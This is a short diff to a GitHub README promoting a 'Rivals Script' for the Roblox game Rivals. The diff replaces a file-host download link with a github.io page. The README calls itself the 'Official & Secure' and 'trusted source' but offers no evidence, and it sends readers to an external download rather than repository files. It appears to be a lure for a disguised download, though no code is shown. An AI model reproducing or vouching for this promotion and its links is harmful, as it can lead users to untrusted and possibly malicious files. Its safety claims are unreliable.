@@ -1,7 +1,7 @@
 # Official & Secure Download Source for Rivals Script – Elevate Your Roblox Experience with the Ultimate Scripting Tool! 🚀⚔️  
 This GitHub repository is the trusted source for downloading Rivals Script, a powerful and versatile script designed specifically for the popular Roblox game *Rivals*. Whether you're a casual player looking to enhance your gameplay or an experienced developer exploring advanced features, this is your go-to place to get the latest version of Rivals Script.
 
-**[![Download Rivals Script](https://img.shields.io/badge/Download-Rivals%20Script-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)**
+**[![Download Rivals Script](https://img.shields.io/badge/Download-Rivals%20Script-blueviolet)](https://roblox-rivals-script.github.io/.github/)**
 
 ✨ **What You'll Find Here:**  
 - **Latest Stable Release**: Always access the newest version of Rivals Script directly from this repository.  
